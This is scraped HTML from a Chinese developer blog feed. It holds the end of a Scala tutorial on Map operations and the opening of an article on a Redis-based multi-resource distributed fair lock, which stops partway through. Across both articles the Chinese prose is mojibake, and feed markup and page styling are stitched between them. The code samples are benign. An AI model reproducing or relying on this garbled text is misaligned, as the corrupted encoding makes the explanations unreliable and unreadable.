<li><strong>å¯å˜Mapåˆ›å»º</strong>ï¼šä½¿ç”¨<code>scala.collection.mutable.Map</code>åˆ›å»ºå¯å˜Mapï¼Œåˆå§‹åŒ…å«"alice"å’Œ"bob"çš„æˆç»©</li>
<li><strong>æ·»åŠ æ“ä½œ</strong>ï¼šä½¿ç”¨<code>+=</code>æ“ä½œç¬¦ç›´æ¥å‘å¯å˜Mapæ·»åŠ "max"çš„æˆç»©ï¼Œè¿™ä¼šä¿®æ”¹åŸMap</li>
<li><strong>ä¸å¯å˜Mapåˆ›å»º</strong>ï¼šä½¿ç”¨<code>scala.collection.immutable.Map</code>åˆ›å»ºä¸å¯å˜Map</li>
<li><strong>ä¸å¯å˜Mapæ·»åŠ </strong>ï¼šé€šè¿‡<code>+</code>æ“ä½œç¬¦åˆ›å»ºæ–°çš„Mapï¼ŒåŸMapä¿æŒä¸å˜ï¼Œä½“ç°äº†ä¸å¯å˜é›†åˆçš„ç‰¹æ€§</li>
<li><strong>é”®å€¼å¯¹è¯­æ³•</strong>ï¼šä½¿ç”¨<code>-&gt;</code>æ“ä½œç¬¦åˆ›å»ºé”®å€¼å¯¹ï¼Œè¯­æ³•æ¸…æ™°ç›´è§‚</li>
</ol>
<h3 data-id="heading-10">æ¡ˆä¾‹äºŒï¼šMapçš„å¢åˆ æ”¹æŸ¥æ“ä½œ</h3>
<h4 data-id="heading-11">ä»£ç </h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> map
<span class="hljs-number">9</span>
<span class="hljs-comment">/*
*
* Map, æ˜ å°„ï¼Œè¡¨ç¤ºä¸€ç§ä¸€ä¸€å¯¹åº”å…³ç³»
* 1. æ·»åŠ 
* 2. åˆ é™¤
* 3. æŸ¥è¯¢ï¼Œå¯¹åº”çš„å€¼
* 4. éå†ï¼ŒæŠŠæ‰€æœ‰çš„æ•°æ®ï¼Œä¾æ¬¡è®¿é—®
* */</span>
<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">map02</span> </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-comment">// åˆ›å»ºå¯å˜çš„Map  é”®  å€¼  å¯¹</span>
    <span class="hljs-keyword">val</span> scores = scala.collection.mutable.<span class="hljs-type">Map</span>(<span class="hljs-string">"alice"</span> -&gt; <span class="hljs-number">90</span>, <span class="hljs-string">"bob1"</span> -&gt; <span class="hljs-number">85</span>)
    <span class="hljs-comment">// 1. æ·»åŠ </span>
    scores += (<span class="hljs-string">"map"</span> -&gt; <span class="hljs-number">100</span>)

    <span class="hljs-comment">// 2. åˆ é™¤ aliceã€‚ åˆ é™¤æ“ä½œæ˜¯æ ¹æ®keyæ¥åšçš„</span>
    scores -= <span class="hljs-string">"alice"</span>

    <span class="hljs-comment">// 3. æŸ¥è¯¢ã€‚æŸ¥çœ‹bobçš„åˆ†æ•°. rst æ˜¯ä¸€ä¸ªOptionç±»å‹</span>
    <span class="hljs-keyword">val</span> rst = scores.get(<span class="hljs-string">"bob1"</span>)
    <span class="hljs-keyword">if</span> (rst.isEmpty){
      println(<span class="hljs-string">"bob1æ²¡æœ‰æˆç»©"</span>)
    } <span class="hljs-keyword">else</span> {
      println(rst.get)
    }
    <span class="hljs-comment">// 4. æ‰“å°scores</span>
    println(scores)
    <span class="hljs-comment">// ç¬¬äºŒç§æ–¹æ³• for</span>
    <span class="hljs-keyword">for</span> ((key,value) &lt;- scores){
      println(<span class="hljs-string">s"<span class="hljs-subst">${key}</span>, <span class="hljs-subst">${value}</span>åˆ†"</span>)
    }

    <span class="hljs-comment">// ç¬¬äºŒç§æ–¹æ³• foreach</span>
    scores.foreach({
      <span class="hljs-keyword">case</span> (key,value) =&gt; println(<span class="hljs-string">s"<span class="hljs-subst">${key}</span>, <span class="hljs-subst">${value}</span>åˆ†"</span>)
    })
  }
}
</code></pre>
<h4 data-id="heading-12">ç»“æœå±•ç¤º</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c02ec9a43914cc1b3f9bd4e3001fcef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LuK5aSp5rKh5pyJ55uQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764829518&amp;x-signature=mwXGkiXbHfGa%2BeEjBeBzNPnDC5s%3D" alt="02.png" loading="lazy"/></p>
<h4 data-id="heading-13">ä»£ç åˆ†æ</h4>
<ol>
<li><strong>æ·»åŠ å…ƒç´ </strong>ï¼šä½¿ç”¨<code>+=</code>æ“ä½œç¬¦æ·»åŠ æ–°çš„é”®å€¼å¯¹"map" -&gt; 100</li>
<li><strong>åˆ é™¤å…ƒç´ </strong>ï¼šä½¿ç”¨<code>-=</code>æ“ä½œç¬¦æ ¹æ®é”®åˆ é™¤"alice"å¯¹åº”çš„æ¡ç›®</li>
<li><strong>æŸ¥è¯¢å…ƒç´ </strong>ï¼š
<ul>
<li>ä½¿ç”¨<code>get</code>æ–¹æ³•æŸ¥è¯¢ï¼Œè¿”å›<code>Option</code>ç±»å‹ï¼Œå®‰å…¨å¤„ç†å¯èƒ½ä¸å­˜åœ¨çš„é”®</li>
<li>é€šè¿‡<code>isEmpty</code>åˆ¤æ–­æ˜¯å¦å­˜åœ¨ï¼Œé¿å…ç©ºæŒ‡é’ˆå¼‚å¸¸</li>
<li>ä½¿ç”¨<code>get</code>æ–¹æ³•ä»<code>Option</code>ä¸­æå–å®é™…å€¼</li>
</ul>
</li>
<li><strong>éå†æ–¹å¼ä¸€</strong>ï¼šä½¿ç”¨<code>for</code>å¾ªç¯é…åˆæ¨¡å¼åŒ¹é…ï¼Œç›´æ¥è§£æ„é”®å€¼å¯¹</li>
<li><strong>éå†æ–¹å¼äºŒ</strong>ï¼šä½¿ç”¨<code>foreach</code>æ–¹æ³•é…åˆcaseè¯­å¥ï¼Œå‡½æ•°å¼é£æ ¼éå†</li>
<li><strong>è¾“å‡ºæ ¼å¼</strong>ï¼šä½¿ç”¨å­—ç¬¦ä¸²æ’å€¼<code>s"${key}, ${value}åˆ†"</code>æ ¼å¼åŒ–è¾“å‡º</li>
</ol>
<h2 data-id="heading-14">ä¸‰ã€Mapçš„å¸¸ç”¨æ–¹æ³•è¯¦è§£</h2>
<h3 data-id="heading-15">æ·»åŠ å…ƒç´ </h3>
<p><strong>å¯å˜Map</strong>ï¼š</p>
<ul>
<li><code>+=</code>æ“ä½œç¬¦ï¼š<code>map += (key -&gt; value)</code></li>
<li><code>put</code>æ–¹æ³•ï¼š<code>map.put(key, value)</code></li>
</ul>
<p><strong>ä¸å¯å˜Map</strong>ï¼š</p>
<ul>
<li><code>+</code>æ“ä½œç¬¦ï¼š<code>val newMapName: Map[KeyType, ValueType] = oldMapName + (newKey -&gt;newValue)</code>ï¼ˆåˆ›å»ºæ–°Mapï¼‰</li>
</ul>
<h3 data-id="heading-16">æŸ¥è¯¢å…ƒç´ </h3>
<ul>
<li><code>get</code>æ–¹æ³•ï¼š<code>val valueOption: Option[ValueType] = mapName.get(key)</code> ï¼Œè¿”å›<code>Option[ValueType]</code>ï¼Œå®‰å…¨æŸ¥è¯¢</li>
<li>ç›´æ¥è®¿é—®ï¼š<code>map(key)</code>ï¼Œé”®ä¸å­˜åœ¨æ—¶æŠ›å‡ºå¼‚å¸¸</li>
</ul>
<h3 data-id="heading-17">åˆ é™¤å…ƒç´ ï¼ˆä»…å¯å˜Mapï¼‰</h3>
<ul>
<li><code>-=</code>æ“ä½œç¬¦ï¼š<code>mapName -= key</code></li>
<li><code>remove</code>æ–¹æ³•ï¼š<code>mapName.remove(key)</code></li>
</ul>
<h3 data-id="heading-18">éå†Map</h3>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// forå¾ªç¯éå†</span>
<span class="hljs-keyword">for</span> ((key, value) &lt;- map) {
    println(<span class="hljs-string">s"<span class="hljs-subst">$key</span>: <span class="hljs-subst">$value</span>"</span>)
}

<span class="hljs-comment">// foreachæ–¹æ³•éå†</span>
map.foreach { <span class="hljs-keyword">case</span> (key, value) =&gt;
    println(<span class="hljs-string">s"<span class="hljs-subst">$key</span>: <span class="hljs-subst">$value</span>"</span>)
}
</code></pre>
<h2 data-id="heading-19">å››ã€æ€»ç»“</h2>
<p>é€šè¿‡æœ¬ç¯‡æ–‡ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å…¨é¢æŒæ¡äº†Scalaä¸­Mapé›†åˆçš„æ ¸å¿ƒçŸ¥è¯†ï¼š</p>
<h3 data-id="heading-20">æ ¸å¿ƒè¦ç‚¹</h3>
<ol>
<li><strong>ä¸¤ç§Mapç±»å‹</strong>ï¼šå¯å˜Mapå…è®¸åŸåœ°ä¿®æ”¹ï¼Œä¸å¯å˜Mapæ“ä½œåè¿”å›æ–°é›†åˆ</li>
<li><strong>å®‰å…¨æŸ¥è¯¢</strong>ï¼šä½¿ç”¨<code>get</code>æ–¹æ³•é…åˆ<code>Option</code>ç±»å‹é¿å…è¿è¡Œæ—¶å¼‚å¸¸</li>
<li><strong>å¤šç§éå†</strong>ï¼šæ”¯æŒ<code>for</code>å¾ªç¯å’Œ<code>foreach</code>ä¸¤ç§éå†æ–¹å¼</li>
<li><strong>ä¸°å¯Œæ“ä½œ</strong>ï¼šæä¾›å®Œæ•´çš„å¢åˆ æ”¹æŸ¥API</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŸºäºredisçš„å¤šèµ„æºåˆ†å¸ƒå¼å…¬å¹³é”çš„è®¾è®¡ä¸å®è·µ]]></title>    <link>https://juejin.cn/post/7576955345379115071</link>    <guid>https://juejin.cn/post/7576955345379115071</guid>    <pubDate>2025-11-27T06:50:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576955345379115071" data-draft-id="7576955345379098687" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŸºäºredisçš„å¤šèµ„æºåˆ†å¸ƒå¼å…¬å¹³é”çš„è®¾è®¡ä¸å®è·µ"/> <meta itemprop="keywords" content="åç«¯,Redis"/> <meta itemprop="datePublished" content="2025-11-27T06:50:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æµ·å°”æ™ºæ…§å®¶æŠ€æœ¯å¹³å°"/> <meta itemprop="url" content="https://juejin.cn/user/3848721122725016"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŸºäºredisçš„å¤šèµ„æºåˆ†å¸ƒå¼å…¬å¹³é”çš„è®¾è®¡ä¸å®è·µ
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/7156434854350389283/posts" data-v-d326b38e=""><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a4176c1a2e0b4e1b986f105126840cc9~tplv-k3u1fbpfcp-watermark.image?" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/7156434854350389283/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="ä¸‰ç¿¼é¸Ÿæ•°å­—åŒ–æŠ€æœ¯å›¢é˜Ÿ" class="title" data-v-d326b38e="">ä¸‰ç¿¼é¸Ÿæ•°å­—åŒ–æŠ€æœ¯å›¢é˜Ÿ</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2025-11-27T06:50:34.000Z" title="Thu Nov 27 2025 06:50:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2025-11-27
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                é˜…è¯»8åˆ†é’Ÿ
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        å…³æ³¨
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              @æµ·å°”ä¼˜å®¶æ™ºèƒ½ç§‘æŠ€ï¼ˆåŒ—äº¬ï¼‰æœ‰é™å…¬å¸
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Â 1.èƒŒæ™¯</h2>
<p>åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿæ¶æ„ä¸­ï¼Œå¤šèŠ‚ç‚¹å¹¶å‘è®¿é—®å…±äº«èµ„æºæ˜¯å¸¸è§åœºæ™¯ã€‚å½“ä¸šåŠ¡æ¶‰åŠå¤šä¸ªå…³è”èµ„æºçš„ååŒæ“ä½œæ—¶ï¼ˆå¦‚è®¢å•ç³»ç»Ÿä¸­çš„å•†å“ä¸åº“å­˜ç­‰ï¼‰ï¼Œä¼ ç»Ÿå•èµ„æºé”æ— æ³•æ»¡è¶³ä¸šåŠ¡éœ€æ±‚ï¼Œè€Œå¤šèµ„æºé”çš„å®ç°åˆé¢ä¸´ä»¥ä¸‹æŒ‘æˆ˜ï¼š</p>
<ul>
<li>æ­»é”é£é™©ï¼šä¸åŒèŠ‚ç‚¹ä»¥ä¸åŒé¡ºåºè·å–å¤šä¸ªé”æ—¶æ˜“å¯¼è‡´æ­»é”</li>
<li>å…¬å¹³æ€§é—®é¢˜ï¼šå…ˆåˆ°è¯·æ±‚å¯èƒ½å› èµ„æºè·å–é¡ºåºä¸å…¬å¯¼è‡´é•¿æ—¶é—´ç­‰å¾…</li>
<li>æ€§èƒ½ç“¶é¢ˆï¼šåˆ†å¸ƒå¼é”çš„è·å–ä¸é‡Šæ”¾æ¶‰åŠç½‘ç»œé€šä¿¡ï¼Œéœ€ä¼˜åŒ–é‡è¯•æœºåˆ¶</li>
</ul>
<h2 data-id="heading-1">2.æ ¸å¿ƒé—®é¢˜</h2>
<h3 data-id="heading-2">2.1 å…¸å‹ä¸šåŠ¡åœºæ™¯</h3>
<p>ä»¥ç”µå•†åº“å­˜æ‰£å‡ä¸ºä¾‹ï¼š</p>
<ul>
<li>æ“ä½œ1ï¼šæ‰£å‡å•†å“åº“å­˜ï¼ˆéœ€é”å®šå•†å“åº“å­˜èµ„æºï¼‰</li>
<li>æ“ä½œ2ï¼šæ‰£å‡ä»“åº“åº“å­˜ï¼ˆéœ€é”å®šä»“åº“åº“å­˜èµ„æºï¼‰</li>
<li>å¤åˆæ“ä½œï¼šåŒæ—¶æ‰£å‡å•†å“åº“å­˜å’Œä»“åº“åº“å­˜ï¼ˆéœ€åŒæ—¶é”å®šå•†å“åº“å­˜å’Œä»“åº“åº“å­˜èµ„æºï¼‰</li>
</ul>
<h3 data-id="heading-3">2.2 æŠ€æœ¯ç—›ç‚¹</h3>
<ul>
<li>é¡ºåºæ•æ„Ÿï¼šè‹¥æ“ä½œ1å…ˆé”å•†å“åº“å­˜å†é”ä»“åº“åº“å­˜ï¼Œæ“ä½œ2åä¹‹ï¼Œå¯èƒ½å½¢æˆå¾ªç¯ç­‰å¾…</li>
<li>é¥¥é¥¿ç°è±¡ï¼šååˆ°çš„è¯·æ±‚å¯èƒ½æŠ¢å å…ˆåˆ°çš„è¯·æ±‚èµ„æº</li>
<li>åŸå­æ€§ä¿éšœï¼šå¤šèµ„æºé”å®šéœ€ä¿è¯è¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥</li>
</ul>
<h2 data-id="heading-4">3.é—®é¢˜åˆ†æ</h2>
<h3 data-id="heading-5">3.1.ç°æœ‰æ–¹æ¡ˆå¯¹æ¯”</h3>



































<table><thead><tr><th/><th/><th/></tr></thead><tbody><tr><td><strong>æ–¹æ¡ˆç±»å‹</strong></td><td><strong>ä¼˜ç‚¹</strong></td><td><strong>ç¼ºç‚¹</strong></td></tr><tr><td>å•èµ„æºé”</td><td>å®ç°ç®€å•</td><td>æ— æ³•å¤„ç†å¤šèµ„æºå…³è”åœºæ™¯</td></tr><tr><td>é¡ºåºé”</td><td>é¿å…æ­»é”</td><td>éœ€ä¸¥æ ¼çº¦å®šåŠ é”é¡ºåºï¼Œçµæ´»æ€§å·®</td></tr><tr><td>RedLockç®—æ³•</td><td>é«˜å¯ç”¨</td><td>ä¸ä¿è¯å…¬å¹³æ€§ï¼Œæ—¶é’Ÿæ¼‚ç§»é—®é¢˜</td></tr><tr><td>é˜Ÿåˆ—ç­‰å¾…æœºåˆ¶</td><td>å¤©ç„¶å…¬å¹³</td><td>å®ç°å¤æ‚ï¼Œéœ€å¤„ç†è¶…æ—¶å’Œé‡è¯•</td></tr></tbody></table>
<h3 data-id="heading-6">3.2.å…³é”®éœ€æ±‚</h3>
<ul>
<li>å…¬å¹³æ€§ï¼šä¿è¯å…ˆåˆ°è¯·æ±‚ä¼˜å…ˆè·å–èµ„æº</li>
<li>åŸå­æ€§ï¼šå¤šèµ„æºé”å®š/é‡Šæ”¾çš„åŸå­æ“ä½œ</li>
<li>çµæ´»æ€§ï¼šæ”¯æŒå•/åŒèµ„æºæ··åˆé”å®š</li>
<li>å®¹é”™æ€§ï¼šè¶…æ—¶è‡ªåŠ¨é‡Šæ”¾é¿å…æ­»é”</li>
</ul>
<h2 data-id="heading-7">4.è§£å†³æ–¹æ¡ˆï¼šå¤šèµ„æºåˆ†å¸ƒå¼é¡ºåºé”</h2>
<h3 data-id="heading-8">4.1.æ ¸å¿ƒè®¾è®¡æ€æƒ³</h3>
<p>é€šè¿‡Rediså®ç°åŸºäºç­‰å¾…é˜Ÿåˆ—çš„å…¬å¹³é”æœºåˆ¶ï¼Œç»“åˆLuaè„šæœ¬ä¿è¯åŸå­æ€§æ“ä½œï¼Œä¸»è¦åŒ…å«ï¼š</p>
<ul>
<li>å¤šKeyè®¾è®¡ï¼šé˜Ÿåˆ—Keyï¼ˆç»´æŠ¤è¯·æ±‚é¡ºåºï¼‰ + é”Keyï¼ˆå®é™…èµ„æºé”å®šï¼‰</li>
<li>å¤šé˜¶æ®µéªŒè¯ï¼šå…ˆç¡®è®¤é˜Ÿåˆ—å¤´éƒ¨ä½ç½®ï¼Œå†æ‰§è¡ŒåŸå­åŠ é”</li>
<li>å¤šèµ„æºæ”¯æŒï¼šé€šè¿‡ç»Ÿä¸€èµ„æºæ ‡è¯†å¤„ç†å¤šèµ„æºåœºæ™¯</li>
</ul>
<h3 data-id="heading-9">4.2.æŠ€æœ¯å®ç°è¯¦è§£</h3>
<h4 data-id="heading-10">4.2.1 å…³é”®ç»„ä»¶</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicResourceLock</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span>  RedisTemplate&lt;String, String&gt; redisTemplate;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">lockPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">"mall:Lock:"</span>; <span class="hljs-comment">//é”å‰ç¼€</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">queuePrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">"mall:Queue:"</span>; <span class="hljs-comment">//é˜Ÿåˆ—å‰ç¼€</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">defaultTimeout</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>; <span class="hljs-comment">// é»˜è®¤è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">lockTTL</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>; <span class="hljs-comment">// é”æŒæœ‰æ—¶é—´ï¼ˆç§’ï¼‰</span>
    
}
</code></pre>
<h4 data-id="heading-11">4.2.2æ ¸å¿ƒæµç¨‹</h4>
<p><strong>1.èµ„æºæ³¨å†Œ</strong></p>
<ul>
<li>å°†æœ‰æ•ˆèµ„æºIDï¼ˆr1,r2ï¼‰ç»Ÿä¸€å¤„ç†ä¸ºå­—ç¬¦ä¸²åˆ—è¡¨</li>
<li>ç¤ºä¾‹ï¼š<code>getValidResources("C123", "W456")</code> â†’ ["<code>C123</code>", "<code>W456</code>"]</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">getValidResources</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> cId, <span class="hljs-built_in">String</span> wId</span>) {
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; resources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">// æ·»åŠ åŸæœ‰çš„uocIdå’ŒjshIdèµ„æº</span>
    <span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">stream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{cId, wId})
            .<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Objects</span>::nonNull)
            .<span class="hljs-title function_">filter</span>(s -&gt; !s.<span class="hljs-title function_">isEmpty</span>())
            .<span class="hljs-title function_">forEach</span>(<span class="hljs-attr">resources</span>::add);
    <span class="hljs-keyword">return</span> resources;
}
</code></pre>
<p><strong>2.å…¥é˜Ÿæ“ä½œ</strong></p>
<ul>
<li>ä½¿ç”¨Redis Listçš„rightPushä¿è¯FIFOé¡ºåº</li>
<li>è®¾ç½®é˜Ÿåˆ—TTLé˜²æ­¢æ­»é˜Ÿåˆ—</li>
<li>è®¾ç½®lockId ****é”æ ‡è¯†ç¬¦ï¼Œç¡®ä¿åªæœ‰åˆæ³•çš„æŒæœ‰è€…æ‰èƒ½é‡Šæ”¾é”</li>
</ul>
